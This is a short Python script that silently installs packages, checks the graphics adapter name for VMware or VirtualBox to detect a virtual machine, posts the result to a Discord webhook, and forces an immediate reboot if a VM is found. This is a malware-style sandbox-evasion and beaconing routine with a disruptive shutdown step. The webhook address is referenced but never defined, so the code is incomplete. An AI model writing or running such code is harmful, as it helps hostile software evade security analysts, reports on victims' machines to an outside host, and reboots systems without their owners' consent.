import subprocess
import sys
import os
import json
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    import psutil
except ImportError:
    install('psutil')
    import psutil
def check_gpu():
    try:
        result = subprocess.run(["wmic", "path", "Win32_VideoController", "get", "Caption"], capture_output=True, text=True)
        if 'VMware' in result.stdout or 'VirtualBox' in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error checking GPU: {e}")
        return False
def send_to_discord(is_vm):
    payload = {
        "content": "VM Detection Result",
        "embeds": [
            {
                "title": "Virtual Machine Detection Result:",
                "description": "True" if is_vm else "False",
                "color": 0x8B0000
            }
        ]
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")
def restart_system():
    try:
        os.system('shutdown /r /t 0')
    except Exception as e:
        print(f"Error restarting system: {e}")
is_vm = check_gpu()
send_to_discord(is_vm)
if is_vm:
    restart_system()
